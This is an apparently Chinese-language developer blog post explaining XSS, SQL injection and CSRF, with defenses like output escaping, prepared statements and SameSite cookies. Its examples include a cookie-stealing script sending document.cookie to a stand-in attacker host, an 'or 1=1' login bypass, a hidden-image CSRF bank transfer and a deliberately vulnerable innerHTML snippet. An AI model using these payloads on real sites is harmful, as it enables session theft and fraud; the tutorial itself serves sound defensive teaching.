@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="zh-tw">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>常見的網站攻擊方式 | Yu&#39;s Blog</title>
+
+
+    <meta name="keywords" content="資訊安全, XSS, SQL injection, CSRF">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="在討論常見的網站攻擊方式之前，可以先認識一下 OWASP。  Open Web Application Security Project  OWASP 是一個線上社群，介紹了各種不同的網路安全問題、每幾年的十大安全問題排名跟範例，完全免費，基本上是所有做資訊安全的聖經。 推薦 techbridge 的 這篇文章，講了 2010 及 2013 的前十大網站攻擊排行，以及 這篇 是官方在 2017 年">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常見的網站攻擊方式">
+<meta property="og:url" content="https://yu040419.github.io/blog/article/attack/index.html">
+<meta property="og:site_name" content="Yu&#39;s Blog">
+<meta property="og:description" content="在討論常見的網站攻擊方式之前，可以先認識一下 OWASP。  Open Web Application Security Project  OWASP 是一個線上社群，介紹了各種不同的網路安全問題、每幾年的十大安全問題排名跟範例，完全免費，基本上是所有做資訊安全的聖經。 推薦 techbridge 的 這篇文章，講了 2010 及 2013 的前十大網站攻擊排行，以及 這篇 是官方在 2017 年">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2021-03-11T07:51:12.000Z">
+<meta property="article:modified_time" content="2024-02-13T09:52:07.717Z">
+<meta property="article:author" content="Yu">
+<meta property="article:tag" content="資訊安全">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SQL injection">
+<meta property="article:tag" content="CSRF">
+<meta name="twitter:card" content="summary_large_image">
+
+
+    
+<link rel="stylesheet" href="/blog/css/style/main.css">
+ 
+
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/hexo-theme-cards@1.2/dist/css/highlight/default.min.css" media="none" >
+        
+            <link rel="stylesheet" id="hl-dark-theme" href="https://cdn.jsdelivr.net/npm/hexo-theme-cards@1.2/dist/css/highlight/dark.min.css" media="none">
+        
+    
+
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/blog/css/style/dark.css">
+
+    
+<script src="/blog/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/blog/" class="button">
+            <span class="logo__text">Yu&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/blog/" class="navbar-menu button">首頁</a>
+                
+                    <a href="/blog/archives/" class="navbar-menu button">所有文章</a>
+                
+                    <a href="/blog/tags/" class="navbar-menu button">標籤</a>
+                
+                    <a href="/blog/about/" class="navbar-menu button">關於我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/blog/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/blog/" class="dropdown-menu button">首頁</a>
+                
+                    <a href="/blog/archives/" class="dropdown-menu button">所有文章</a>
+                
+                    <a href="/blog/tags/" class="dropdown-menu button">標籤</a>
+                
+                    <a href="/blog/about/" class="dropdown-menu button">關於我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        常見的網站攻擊方式
+    </h1>
+    <div class="post-title__meta">
+        <a href="/blog/archives/2021/03/" class="post-meta__date button">2021-03-11</a>
+        
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%84%B2%E5%AD%98%E5%9E%8B"><span class="toc-text">儲存型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-XSS"><span class="toc-text">DOM XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-Submit-Cookie"><span class="toc-text">Double Submit Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Samesite"><span class="toc-text">Samesite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B8%AC%E8%A9%A6%E5%B0%8F%E9%81%8A%E6%88%B2"><span class="toc-text">有趣的測試小遊戲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90"><span class="toc-text">資料來源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A3%9C%E5%85%85%E8%B3%87%E6%96%99"><span class="toc-text">補充資料</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">文章目錄</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%84%B2%E5%AD%98%E5%9E%8B"><span class="toc-text">儲存型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-XSS"><span class="toc-text">DOM XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-Submit-Cookie"><span class="toc-text">Double Submit Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Samesite"><span class="toc-text">Samesite</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B8%AC%E8%A9%A6%E5%B0%8F%E9%81%8A%E6%88%B2"><span class="toc-text">有趣的測試小遊戲</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B3%87%E6%96%99%E4%BE%86%E6%BA%90"><span class="toc-text">資料來源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A3%9C%E5%85%85%E8%B3%87%E6%96%99"><span class="toc-text">補充資料</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <p>在討論常見的網站攻擊方式之前，可以先認識一下 <strong>OWASP</strong>。</p>
+<blockquote>
+<p>Open Web Application Security Project</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://owasp.org/">OWASP</a> 是一個線上社群，介紹了各種不同的網路安全問題、每幾年的十大安全問題排名跟範例，完全免費，基本上是所有做資訊安全的聖經。</p>
+<p>推薦 techbridge 的 <a target="_blank" rel="noopener" href="https://blog.techbridge.cc/2017/05/07/owasp/">這篇文章</a>，講了 2010 及 2013 的前十大網站攻擊排行，以及 <a target="_blank" rel="noopener" href="https://owasp.org/www-pdf-archive/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.2.pdf">這篇</a> 是官方在 2017 年十大攻擊手法的中文版本。</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote>
+<p>Cross-Site-Scripting，俗稱 JavaScript Injection，中文被翻成跨站式腳本攻擊或是跨站攻擊。</p>
+</blockquote>
+<p>XSS 是在使用者可操控的地方，像是留言內容、帳號名稱等地方，惡意寫入程式碼，讓網站載入這些內容時，一起執行這些程式。</p>
+<p>常見的可能就是透過插入一個圖片，圖片會自動訪問 hackerhome 上的 grabber.jsp，並將使用者的 cookie 作為 msg 的值，讓受害者的 cookie 遭盜用。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;img src=http://www.hackerhome.com/grabber.jsp?msg=&#x27;</span> <span class="built_in">document</span>.cookie <span class="string">&#x27;</span></span><br><span class="line"><span class="string">2     width=0 height=0 border=0 /&gt;SomeStore&#x27;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以要做的事情，就是防範讓伺服器知道這並不是程式碼，而只是一般的文字。可以透過 php 內建的 <code>htmlspecialchars</code> 達成這件事。</p>
+<p>但要特別注意的是，並不是像 hash 一樣，在輸入密碼後就馬上處理並將 hash 過的內容存在資料庫，而是儲存原本的字元在資料庫，輸出時再經由<code>htmlspecialchars</code> 轉化。因為輸入防不勝防，直接解決輸出才能打到痛點。</p>
+<figure class="highlight php"><figcaption><span>utils.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params"><span class="variable">$str</span></span>) </span>&#123; <span class="comment">// 之後就可以呼叫 escape()</span></span><br><span class="line">  <span class="keyword">return</span> htmlspecialchars(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><figcaption><span>index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;comment__info--name&#x27;&gt;&quot;</span> . escape(<span class="variable">$row</span>[<span class="string">&#x27;nickname&#x27;</span>]) . <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;textarea class=&#x27;comment__text&#x27;&gt;&quot;</span> . escape(<span class="variable">$row</span>[<span class="string">&#x27;text&#x27;</span>]) . <span class="string">&quot;&lt;/textarea&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="儲存型"><a href="#儲存型" class="headerlink" title="儲存型"></a>儲存型</h3><blockquote>
+<p>stored XSS，或被稱為 persisted XSS</p>
+</blockquote>
+<p>以輸入惡意、並會儲存到資料庫的資料方式攻擊，這種稱為儲存型 XSS，也就是前面提到的攻擊方式。</p>
+<p>一般多以這種攻擊方式，因為這種攻擊方式的網址正常，只要成功攻擊，一般使用者只要點入就很有可能被竊取資料、或是被轉到其他網站。</p>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><blockquote>
+<p>Reflected XSS</p>
+</blockquote>
+<p>反射型是利用有些網站會將 query string 的內容，直接顯示在螢幕上作為提示文字，竄改 query string 的內容，將惡意程式碼放入 query string 達到攻擊目的。</p>
+<p>但這種方式需要刻意讓使用者點選帶有奇怪程式碼的網址，所以一般比較少見。</p>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><blockquote>
+<p>DOM-Based XSS（基於 DOM 的 XSS 類型）</p>
+</blockquote>
+<p>透過程式碼當中 DOM 節點的 <code>.html</code> 或是 <code>.innerHtml</code> 漏洞，即可輸入 HTML 標籤，也就是可輸入 <code>&lt;script&gt;</code> <code>&lt;img&gt;</code> 標籤，將惡意程式碼帶入。</p>
+<p>跟前面兩種 XSS 攻擊手法比較不一樣，前面兩種主要防範方式都是從後端，但 DOM XSS 從前端就可以簡單防範，直接看範例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hi，<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;show_name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 這裡會顯示輸入的名稱 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 輸入名稱 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;createText();&quot;</span>&gt;</span>Say Hi<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 執行 createText() --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> createText = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> name = <span class="built_in">document</span>.querySelector(<span class="string">&quot;#name&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.querySelector(<span class="string">&quot;.show_name&quot;</span>).innerHTML = name; <span class="comment">// 漏洞在這裡</span></span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果沒有檢查輸入，輸入可填入以下內容即可輕鬆執行程式碼。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=# <span class="attribute">onerror</span>=<span class="string">&quot;alert(123)&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解決方法其實很簡單，只要把 <code>.html</code> 或是 <code>.innerHtml</code> 都改成 <code>.text</code> 及 <code>innerText</code> 就可以了。</p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><blockquote>
+<p>被譯為 SQL 注入或是 SQL 隱碼</p>
+</blockquote>
+<p>SQL Injection 一直是 OWASP 的常勝軍。使用的原理也相似，都是透過原本應該輸入文字或帳密等欄位，輸入了程式碼進去。</p>
+<p>跟 XSS 不一樣的是，SQL Injection 是輸入 SQL 的語法，而 XSS 多半是輸入 JS 及 HTML 的語法。</p>
+<p>一個有會員登入功能的網站，都會需要輸入帳號與密碼來進行驗證。而後端程式，如 PHP 就必需支援相關的登入檢查，判定 User 輸入的帳號、密碼是否正確，來確定登入是否成功。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> members <span class="keyword">where</span> account<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>但若是駭客輸入有特殊字元的帳號：「 ‘ or 1&#x3D;1 &#x2F;* 」，密碼：「任意值」，這時 SQL 語法就會變成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> members <span class="keyword">where</span> account<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">/*&#x27; and password=&#x27;&#x27;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">where 條件變成 account = 空值或是 1=1 是 true 的話</span></span><br><span class="line"><span class="comment">1=1 一定是 true 所以就可以成功登入</span></span><br><span class="line"><span class="comment">而且會發現後面被註解掉了</span></span><br><span class="line"><span class="comment">（透過這樣拿到的值通常是資料表第一筆）</span></span><br></pre></td></tr></table></figure>
+
+<p>這時候可以透過 MySQL 內建的語法 <strong>Prepared Statements</strong> 來解決這個問題。</p>
+<figure class="highlight php"><figcaption><span>add.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 原本用 sprintf() 拼接，現在刪掉並將變數值換成 ?</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO yu_comments(user_id, text) VALUES (?, ?)&quot;</span>;</span><br><span class="line"><span class="comment">// stmt 是 statement 的常見縮寫</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 將參數依序放進，第一個代表有兩個參數，一個是 i (interger)，一個是 s (string)</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;is&#x27;</span>, <span class="variable">$user_id</span>, <span class="variable">$text</span>);</span><br><span class="line"><span class="comment">// 最後執行</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line"><span class="comment">//...其他照常...</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><figcaption><span>login.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//...上面照常...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 改成問號</span></span><br><span class="line">  <span class="variable">$sql</span> =  <span class="string">&quot;SELECT * FROM yu_users WHERE username=?&quot;</span></span><br><span class="line">  <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="comment">// 只有一個字串</span></span><br><span class="line">  <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 這裡記得要透過 get_result() 拿到資料</span></span><br><span class="line">  <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">  <span class="comment">// 這裡開始底下如舊</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows === <span class="number">0</span>) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: login_page.php?errcode=2&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc();</span><br><span class="line">  <span class="keyword">if</span> (password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: login_page.php?errcode=2&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>幾件事情要注意：</p>
+<ul>
+<li>只要有 SQL 語法都要改成 prepared statements。</li>
+<li>透過 <code>bind_param()</code> 拼接時記得第一個參數，如果要拼接三個字串是 <code>&#39;sss&#39;</code>; 第一個是字串第二個是整數第三個是字串是 <code>&#39;sis&#39;</code>。</li>
+</ul>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><blockquote>
+<p>Cross Site Request Forgery，跨站請求偽造</p>
+</blockquote>
+<p>假設我們今天登入 A 網站後沒有自行登出，A 網站會透過 Cookie 記住身分，讓我們下次進入網站的時候不需要再登入一次。但駭客其實可以透過這點，讓你誤點選設計好的 B 網站，透過在進入 B 網站時自動發送假的 request 到 A 網站，A 網站的 Server 端會以為這是我們本人發送的，就可以成功執行 request。</p>
+<p>舉例來說，假設我們今天登入了 mybank.com 網站後沒有登出，只要有心人士惡意讓我們點了 myvideo.com 網站：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://mybank.com/transfer?id=11&amp;amount=100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://myvideo.com&quot;</span>&gt;</span>影片連結<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果網站沒有做其他驗證的話，其實很有可能就可以直接轉帳出去了。</p>
+<h3 id="Double-Submit-Cookie"><a href="#Double-Submit-Cookie" class="headerlink" title="Double Submit Cookie"></a>Double Submit Cookie</h3><p>駭客跟使用者是使用不同的網域，也就是說駭客沒有辦法設定該網域的 Cookie，所以其實可以透過這一點來防範這件事。</p>
+<p>由 client side 來生 CSRF token，並且把這個 CSRF token 放進表單及 Cookie 中，在收到 request 的時候 server 再去比對是否有值且相同。</p>
+<p>但這還是有可能會遭到破解，如果駭客進入到了子網域中，根據 Cookie 設定規範，子網域能夠存取父網域的 Cookie，還是有可能可以成功被破解。</p>
+<h3 id="Samesite"><a href="#Samesite" class="headerlink" title="Samesite"></a>Samesite</h3><p>瀏覽器本身就有提供防範 CSRF 的機制，而且很簡單。只要在設定 Cookie 的時候多加一個 SameSite 就好了，用意是讓 Cookie 只允許 same site 使用，不應該在任何的跨網域的 request 被加上去。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set</span>-Cookie: session_id=ewfewjf<span class="number">23</span>o<span class="number">1</span>; SameSite // 預設模式為 SameSite=strict</span><br><span class="line"><span class="attribute">Set</span>-Cookie: session_id=ewfewjf<span class="number">23</span>o<span class="number">1</span>; SameSite=Lax // 或是自行設定為 Lax</span><br></pre></td></tr></table></figure>
+
+<p>透過瀏覽器設定的方式是目前最推薦的做法，<code>Lax</code> 與 <code>strict</code> 的差別，及更詳細資訊可參考 <a target="_blank" rel="noopener" href="https://blog.techbridge.cc/2017/02/25/csrf-introduction/">這篇文章</a>，這邊的筆記也都是參考此篇文章的。</p>
+<h2 id="有趣的測試小遊戲"><a href="#有趣的測試小遊戲" class="headerlink" title="有趣的測試小遊戲"></a>有趣的測試小遊戲</h2><p>這幾個遊戲都是讓你練習該如何學習駭客透過 XSS 及其他方式執行程式碼。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a> (<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=MMMkvHwqPRY">解題影片</a>)</li>
+<li><a target="_blank" rel="noopener" href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a> (可能會被 chrome 擋下來，可以試著用其他瀏覽器玩)</li>
+<li><a target="_blank" rel="noopener" href="http://www.hackertest.net/">http://www.hackertest.net/</a></li>
+</ul>
+<h2 id="資料來源"><a href="#資料來源" class="headerlink" title="資料來源"></a>資料來源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://forum.gamer.com.tw/Co.php?bsn=60292&sn=11267">【網頁安全】給網頁開發新人的 XSS 攻擊介紹與防範</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.puritys.me/docs-blog/article-11-SQL-Injection-%E5%B8%B8%E8%A6%8B%E7%9A%84%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A%E6%96%B9%E5%BC%8F.html">SQL Injection 常見的駭客攻擊方式</a></li>
+</ul>
+<h2 id="補充資料"><a href="#補充資料" class="headerlink" title="補充資料"></a>補充資料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016551188">前端安全系列（一）：如何防止 XSS 攻击？</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@jaydenlin/%E6%B7%BA%E8%AB%87%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A-%E7%B6%B2%E7%AB%99%E5%AE%89%E5%85%A8-%E4%B8%80%E6%AC%A1%E7%9C%8B%E6%87%82-sql-injection-%E7%9A%84%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86-b1994fd2392a">一次看懂 SQL Injection 的攻擊原理</a></li>
+</ul>
+
+    </div>
+     
+    <div class="post-footer__meta"><p>更新於 2024-02-13</p></div> 
